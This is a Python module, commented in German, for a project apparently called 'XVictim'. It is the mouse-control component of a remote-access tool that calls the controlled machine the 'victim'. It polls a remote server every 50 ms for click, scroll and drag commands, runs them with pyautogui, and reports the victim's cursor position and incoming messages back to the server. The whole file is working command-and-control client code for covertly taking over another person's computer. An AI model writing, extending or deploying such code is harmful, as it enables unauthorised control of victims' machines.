#!/usr/bin/env python3
"""
XVictim Victim - Mouse Controller
Empfängt Mouse-Clicks vom Server und führt sie aus
"""

import requests
import pyautogui
import time
import threading
from datetime import datetime
import os
import sys

# Ensure Victim module can be imported
if __name__ == "__main__" and __package__ is None:
    parent = os.path.abspath(os.path.join(os.path.dirname(__file__), os.pardir))
    if parent not in sys.path:
        sys.path.insert(0, parent)

import config  # type: ignore

# === CONFIGURATION ===
SERVER_URL = config.SERVER_URL
POLL_INTERVAL = 0.05  # 50ms - Schnelle Reaktion auf Mouse-Clicks
DOUBLE_CLICK_DELAY = 0.1  # Delay zwischen den Klicks für Double-Click

# Global variables
is_running = False
victim_name = "DANI-PC"  # Standard-Name, wird vom Victim überschrieben


class MouseController:
    """Kontrollt Mouse auf Basis von Server-Befehlen"""
    
    def __init__(self, victim_name_override=None):
        global victim_name
        if victim_name_override:
            victim_name = victim_name_override
        self.is_running = False
        self.click_thread = None
        self.position_thread = None
        self.message_thread = None
        self.last_control_check = 0
        self.cached_enabled = False
        
    def check_control_enabled(self):
        """Check control enabled with caching (every 2 seconds)"""
        if time.time() - self.last_control_check > 2:
            try:
                control_response = requests.get(
                    f"{SERVER_URL}/get_control_enabled/{victim_name}",
                    timeout=2
                )
                if control_response.status_code == 200:
                    control_data = control_response.json()
                    self.cached_enabled = control_data.get("enabled", False)
                self.last_control_check = time.time()
            except Exception:
                pass
        return self.cached_enabled
        
    def start(self):
        """Starte Mouse-Control Thread"""
        if self.is_running:
            print("[!] Mouse controller already running")
            return
        
        self.is_running = True
        self.click_thread = threading.Thread(target=self._poll_loop, daemon=True)
        self.click_thread.start()
        self.position_thread = threading.Thread(target=self._send_mouse_position_loop, daemon=True)
        self.position_thread.start()
        self.message_thread = threading.Thread(target=self._poll_text_messages, daemon=True)
        self.message_thread.start()
        print(f"[+] Mouse controller gestartet für '{victim_name}'")
        print(f"[+] Polling alle {POLL_INTERVAL*1000:.0f}ms auf: {SERVER_URL}/get_mouse_clicks/{victim_name}")
    
    def stop(self):
        """Stoppe Mouse-Control Thread"""
        self.is_running = False
        if self.click_thread:
            self.click_thread.join(timeout=2)
        if self.position_thread:
            self.position_thread.join(timeout=2)
        if self.message_thread:
            self.message_thread.join(timeout=2)
        print("[-] Mouse controller stopped")
    
    def _poll_loop(self):
        """Dauerschleife: Berechne Mouse-Clicks vom Server"""
        error_count = 0
        max_errors = 10
        
        while self.is_running:
            try:
                # Check if control is enabled (cached)
                if not self.check_control_enabled():
                    time.sleep(1)  # Sleep longer if not enabled
                    continue
                
                # Hole alle ausstehenden Mouse-Clicks
                response = requests.get(
                    f"{SERVER_URL}/get_mouse_clicks/{victim_name}",
                    timeout=2
                )
                
                if response.status_code == 200:
                    try:
                        data = response.json()
                        clicks = data.get("clicks", [])
                        
                        if clicks:
                            print(f"[*] Received {len(clicks)} mouse click(s)")
                            for click in clicks:
                                self._execute_click(click)
                        
                        error_count = 0  # Reset error counter on success
                    except (ValueError, KeyError) as json_err:
                        print(f"[!] JSON parse error: {json_err}")
                        error_count += 1
                else:
                    print(f"[!] Server returned status {response.status_code}")
                    error_count += 1
                
            except requests.exceptions.Timeout:
                error_count += 1
                if error_count >= max_errors:
                    print(f"[-] Too many timeouts, stopping mouse controller")
                    self.is_running = False
            except Exception as e:
                error_count += 1
                if error_count == 1:
                    print(f"[!] Error polling mouse clicks: {e}")
                if error_count >= max_errors:
                    print(f"[-] Too many errors, stopping mouse controller")
                    self.is_running = False
            
            time.sleep(POLL_INTERVAL)
    
    def _send_mouse_position_loop(self):
        """Sende aktuelle Mouse Position zum Server"""
        error_count = 0
        max_errors = 10
        
        while self.is_running:
            try:
                # Check if control is enabled (cached)
                if not self.check_control_enabled():
                    time.sleep(1)  # Sleep longer if not enabled
                    continue
                
                # Get current mouse position (absolute)
                x, y = pyautogui.position()
                
                # === Multi-Monitor Support ===
                # Get the current screen index the client is viewing from server
                try:
                    screen_response = requests.get(
                        f"{SERVER_URL}/get_screen_index/{victim_name}",
                        timeout=1
                    )
                    if screen_response.status_code == 200:
                        client_screen_idx = screen_response.json().get("screen_index", 0)
                    else:
                        client_screen_idx = 0
                except Exception as e:
                    client_screen_idx = 0
                
                # Convert absolute position to relative to the screen the client is viewing
                try:
                    import mss
                    with mss.mss() as sct:
                        if client_screen_idx < len(sct.monitors) - 1 and client_screen_idx >= 0:
                            monitor = sct.monitors[client_screen_idx + 1]  # +1 because monitors[0] is combined
                            # Convert absolute position to relative to this monitor
                            relative_x = x - monitor['left']
                            relative_y = y - monitor['top']
                        else:
                            relative_x = x
                            relative_y = y
                except Exception as e:
                    relative_x = x
                    relative_y = y
                
                response = requests.post(
                    f"{SERVER_URL}/mouse_position/{victim_name}",
                    json={"x": relative_x, "y": relative_y},
                    timeout=2
                )
                
                if response.status_code == 200:
                    error_count = 0
                else:
                    error_count += 1
                
            except requests.exceptions.Timeout:
                error_count += 1
            except Exception as e:
                error_count += 1
                if error_count == 1:
                    print(f"[!] Error sending mouse position: {e}")
            
            if error_count >= max_errors:
                print(f"[-] Too many errors in position sender")
                self.is_running = False
            
            time.sleep(0.1)  # Send position every 100ms
    
    def _poll_text_messages(self):
        """Dauerschleife: Hole Text-Nachrichten vom Server"""
        error_count = 0
        max_errors = 10
        
        while self.is_running:
            try:
                # Check if control is enabled (cached)
                if not self.check_control_enabled():
                    time.sleep(1)  # Sleep longer if not enabled
                    continue
                
                response = requests.get(
                    f"{SERVER_URL}/get_messages/{victim_name}",
                    timeout=2
                )
                
                if response.status_code == 200:
                    try:
                        data = response.json()
                        messages = data.get("messages", [])
                        
                        if messages:
                            print(f"[*] Received {len(messages)} text message(s)")
                            for msg in messages:
                                self._handle_text_message(msg)
                        
                        error_count = 0  # Reset error counter on success
                    except (ValueError, KeyError) as json_err:
                        print(f"[!] JSON parse error in messages: {json_err}")
                        error_count += 1
                else:
                    error_count += 1
                
            except requests.exceptions.Timeout:
                error_count += 1
            except Exception as e:
                error_count += 1
                if error_count == 1:
                    print(f"[!] Error polling text messages: {e}")
            
            if error_count >= max_errors:
                print(f"[-] Too many errors in message poller")
                self.is_running = False
            
            time.sleep(1)  # Check for messages every 1 second
    
    def _execute_click(self, click_data):
        """Führe einen Mouse-Click aus"""
        try:
            x = click_data.get("x", 0)
            y = click_data.get("y", 0)
            # Der Server sendet "button", nicht "click_type"
            click_type = click_data.get("button") or click_data.get("click_type", "left")
            screen_index = click_data.get("screen_index", 0)
            
            # Sicherheitsprüfung: Position validieren
            if not isinstance(x, (int, float)) or not isinstance(y, (int, float)):
                print(f"[!] Invalid coordinate types: x={type(x)}, y={type(y)}")
                return
            
            if x < 0 or y < 0:
                print(f"[!] Invalid coordinates: x={x}, y={y}")
                return
            
            # === Multi-Monitor Support ===
            # Get screen dimensions and adjust coordinates if needed
            try:
                import mss
                with mss.mss() as sct:
                    if screen_index < len(sct.monitors) - 1:
                        monitor = sct.monitors[screen_index + 1]  # +1 because monitors[0] is the combined view
                        # Adjust coordinates to account for monitor position
                        adjusted_x = monitor['left'] + x
                        adjusted_y = monitor['top'] + y
                        print(f"[>] Monitor {screen_index}: Offset ({monitor['left']}, {monitor['top']}), Final pos ({adjusted_x}, {adjusted_y})")
                    else:
                        adjusted_x = x
                        adjusted_y = y
                        print(f"[>] Screen index {screen_index} out of range, using raw coordinates ({adjusted_x}, {adjusted_y})")
            except Exception as e:
                print(f"[!] Error getting monitor info: {e}, using raw coordinates")
                adjusted_x = x
                adjusted_y = y
            
            print(f"[>] Executing {click_type} click at screen {screen_index} -> final ({adjusted_x}, {adjusted_y})")
            
            # Fahre zur Position
            pyautogui.moveTo(adjusted_x, adjusted_y, duration=0.1)
            time.sleep(0.05)
            
            # Map click type zum Button
            click_button = "left"
            if click_type == "right":
                click_button = "right"
            elif click_type == "middle":
                click_button = "middle"
            elif click_type == "double":
                click_button = "left"
            else:
                print(f"[!] Unknown click type: {click_type}")
                return
            
            # Führe Click aus
            if click_type == "double":
                # Double-Click: 2x left click mit kleinem Delay
                pyautogui.click(button=click_button)
                time.sleep(DOUBLE_CLICK_DELAY)
                pyautogui.click(button=click_button)
                print(f"[✓] Double click executed")
            else:
                # Single click
                pyautogui.click(button=click_button)
                print(f"[✓] {click_type.capitalize()} click executed")
            
            time.sleep(0.05)
            
        except Exception as e:
            print(f"[!] Error executing click: {e}")
    
    def _handle_text_message(self, message_data):
        """Verarbeite eine empfangene Text-Nachricht"""
        try:
            message = message_data.get("message", "")
            sender = message_data.get("sender", "Unknown")
            timestamp = message_data.get("timestamp", "")
            
            print(f"[MSG] {sender}: {message} (at {timestamp})")
            # Die Nachricht wird einfach ausgegeben. 
            # Erweiterte Verarbeitung (z.B. Benachrichtigungen) können hier hinzugefügt werden
        except Exception as e:
            print(f"[!] Error handling text message: {e}")


class MouseScrollController:
    """Erweiterte Mouse-Kontrolle mit Scroll-Support"""
    
    def __init__(self, mouse_controller):
        self.mouse_controller = mouse_controller
    
    def scroll_up(self, x, y, amount=3):
        """Scroll nach oben"""
        pyautogui.moveTo(x, y, duration=0.1)
        time.sleep(0.05)
        pyautogui.scroll(amount)
        print(f"[✓] Scrolled up at ({x}, {y})")
    
    def scroll_down(self, x, y, amount=3):
        """Scroll nach unten"""
        pyautogui.moveTo(x, y, duration=0.1)
        time.sleep(0.05)
        pyautogui.scroll(-amount)
        print(f"[✓] Scrolled down at ({x}, {y})")
    
    def drag_and_drop(self, x1, y1, x2, y2):
        """Drag & Drop von (x1,y1) zu (x2,y2)"""
        pyautogui.moveTo(x1, y1, duration=0.1)
        time.sleep(0.05)
        pyautogui.mouseDown()
        time.sleep(0.1)
        pyautogui.moveTo(x2, y2, duration=0.3)
        time.sleep(0.05)
        pyautogui.mouseUp()
        print(f"[✓] Drag and drop from ({x1},{y1}) to ({x2},{y2})")


# === GLOBAL INSTANCE ===
_mouse_controller = None
_scroll_controller = None


def initialize_mouse_controller(victim_name=None):
    """Initialisiere den Mouse Controller"""
    global _mouse_controller, _scroll_controller
    
    if _mouse_controller is None:
        _mouse_controller = MouseController(victim_name)
        _scroll_controller = MouseScrollController(_mouse_controller)
    
    return _mouse_controller


def start_mouse_controller(victim_name=None):
    """Starte den Mouse Controller"""
    global _mouse_controller

    # Initialisiere falls notwendig (inkl. Scroll-Controller)
    _mouse_controller = initialize_mouse_controller(victim_name)
    _mouse_controller.start()

    return _mouse_controller


def stop_mouse_controller():
    """Stoppe den Mouse Controller"""
    global _mouse_controller
    
    if _mouse_controller:
        _mouse_controller.stop()


def get_mouse_controller():
    """Gib den aktuell initialisierten MouseController zurück"""
    return _mouse_controller


def get_mouse_scroll_controller():
    """Gib den aktuell initialisierten MouseScrollController zurück"""
    return _scroll_controller


# === TEST / STANDALONE MODE ===
if __name__ == "__main__":
    import sys
    import os
    
    # Setze Victim-Namen aus Umgebungsvariable oder Command-Line
    pc_name = os.environ.get("COMPUTERNAME", "DANI-PC")
    if len(sys.argv) > 1:
        pc_name = sys.argv[1]
    
    print("=" * 70)
    print("[*] XVictim Mouse Controller - Standalone Mode")
    print("=" * 70)
    print(f"[*] Victim Name: {pc_name}")
    print(f"[*] Server URL: {SERVER_URL}")
    print(f"[*] Poll Interval: {POLL_INTERVAL}s (50ms - Schnelle Reaktion)")
    print(f"[*] Polling Endpoint: GET {SERVER_URL}/get_mouse_clicks/{pc_name}")
    print("="*70)
    print("[>] Was dieser Controller macht:")
    print("   - Verbindet sich zu Server auf Port 5000")
    print("   - Pollt alle 50ms auf neue Mouse-Click-Befehle")
    print("   - Führt Clicks/Scrolls/Drags auf dem lokalen System aus")
    print("   - Sendet Befehle von Remote-Client aus zur lokalen Ausführung")
    print("=" * 70)
    
    # Initialize
    controller = initialize_mouse_controller(pc_name)
    controller.start()
    
    try:
        print("[+] Mouse controller running... Press Ctrl+C to stop\n")
        print(f"[*] Warte auf Server-Befehle vom Client...")
        print(f"[*] Status: Verbunden mit {SERVER_URL}\n")
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("\n[!] Shutting down...")
        controller.stop()
        print("[*] Stopped successfully")
